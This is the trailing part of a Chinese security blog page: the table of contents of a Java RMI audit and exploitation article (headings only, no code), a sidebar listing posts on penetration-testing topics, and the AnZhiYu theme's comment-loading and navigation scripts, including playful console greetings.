href="#RMI-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">RMI-代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">服务端的创建流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E7%9A%84%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">注册中心的创建流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E7%BB%91%E5%AE%9A"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">注册绑定</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">1.3.3.</span> <span class="toc-text">客户端请求注册中心和服务端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E5%AF%B9%E8%B1%A1%E7%9A%84%E4%BB%A3%E7%90%86"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">获取远程对象的代理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%90%91%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%81%9A%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">向服务端做远程调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%9B%9E%E5%BA%94%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.3.4.</span> <span class="toc-text">注册中心回应客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%9B%9E%E5%BA%94%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">1.3.5.</span> <span class="toc-text">服务端回应客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DGC"><span class="toc-number">1.3.6.</span> <span class="toc-text">DGC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI-%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">RMI 攻击利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8E%E7%89%88%E6%9C%ACjdk"><span class="toc-number">1.4.1.</span> <span class="toc-text">低版本jdk</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">简单利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9B%B4%E4%BD%8E%E7%89%88%E6%9C%AC%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">更低版本的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.2.</span> <span class="toc-text">高版本jdk绕过利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UnicastRef-class"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">UnicastRef.class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#java-lang-reflect-Proxy-class"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">java.lang.reflect.Proxy.class</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">工具：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exploit"><span class="toc-number">1.4.2.3.1.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payloads"><span class="toc-number">1.4.2.3.2.</span> <span class="toc-text">payloads</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/" title="红日靶场">红日靶场</a><time datetime="2024-10-11T14:29:47.000Z" title="发表于 2024-10-11 22:29:47">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/DC%E9%9D%B6%E5%9C%BA/" title="DC靶场">DC靶场</a><time datetime="2024-10-11T14:25:37.000Z" title="发表于 2024-10-11 22:25:37">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="横向移动">横向移动</a><time datetime="2024-10-11T14:16:00.000Z" title="发表于 2024-10-11 22:16:00">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/java%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马">java内存马</a><time datetime="2024-10-11T14:09:17.000Z" title="发表于 2024-10-11 22:09:17">2024-10-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/11/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python内存马">python内存马</a><time datetime="2024-10-11T14:05:40.000Z" title="发表于 2024-10-11 22:05:40">2024-10-11</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By VVkladg0r</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">47</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">7</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://cszvvds.cc" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 文章总览</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 全部分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 全部标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言面板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CC%E9%93%BE/" style="font-size: 0.88rem;">CC链<sup>7</sup></a><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>2</sup></a><a href="/tags/Windows/" style="font-size: 0.88rem;">Windows<sup>2</sup></a><a href="/tags/java/" style="font-size: 0.88rem;">java<sup>13</sup></a><a href="/tags/java%E5%AE%89%E5%85%A8/" style="font-size: 0.88rem;">java安全<sup>13</sup></a><a href="/tags/misc/" style="font-size: 0.88rem;">misc<sup>1</sup></a><a href="/tags/web/" style="font-size: 0.88rem;">web<sup>9</sup></a><a href="/tags/wp/" style="font-size: 0.88rem;">wp<sup>9</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 0.88rem;">其他<sup>5</sup></a><a href="/tags/%E5%86%85%E7%BD%91/" style="font-size: 0.88rem;">内网<sup>15</sup></a><a href="/tags/%E5%90%8E%E7%AB%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">后端漏洞<sup>5</sup></a><a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">学习<sup>26</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 0.88rem;">工具<sup>2</sup></a><a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">提权<sup>3</sup></a><a href="/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" style="font-size: 0.88rem;">横向移动<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">渗透<sup>15</sup></a><a href="/tags/%E7%BB%B4%E6%9D%83/" style="font-size: 0.88rem;">维权<sup>5</sup></a><a href="/tags/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" style="font-size: 0.88rem;">编程语言<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 VVkladg0r 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initWaline = () => {
    const waline = Waline.init(Object.assign({
      el: '#waline-wrap',
      serverURL: 'waline.cszvvds.cc',
      pageview: false,
      dark: 'html[data-theme="dark"]',
      path: window.location.pathname,
      comment: false,
    }, null))
  }

  const loadWaline = async () => {
    if (typeof Waline === 'object') initWaline()
    else {
      await getCSS('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.css')
      await getScript('https://cdn.cbd.int/@waline/client@2.15.5/dist/waline.js')
      initWaline()
    }
  }

  if ('Waline' === 'Waline' || !true) {
    if (true) anzhiyu.loadComment(document.getElementById('waline-wrap'),loadWaline)
    else setTimeout(loadWaline, 0)
  } else {
    window.loadOtherComment = loadWaline
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script>window.addEventListener('load', () => {
  const changeContent = content => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = async () => {
    try {
      const res = await fetch('waline.cszvvds.cc/api/comment?type=recent&count=6', { method: 'GET' })
      const result = await res.json()
      const walineArray = result.data.map(e => {
        return {
          'content': changeContent(e.comment),
          'avatar': e.avatar,
          'nick': e.nick,
          'url': e.url + '#' + e.objectId,
          'date': e.time || e.insertedAt
        }
      })
      saveToLocal.set('waline-newest-comments', JSON.stringify(walineArray), 10/(60*24))
      generateHtml(walineArray)
    } catch (err) {
      console.error(err)
      const $dom = document.querySelector('#card-newest-comments .aside-list')
      $dom.textContent= "无法获取评论，请确认相关配置是否正确"
    }
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('waline-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>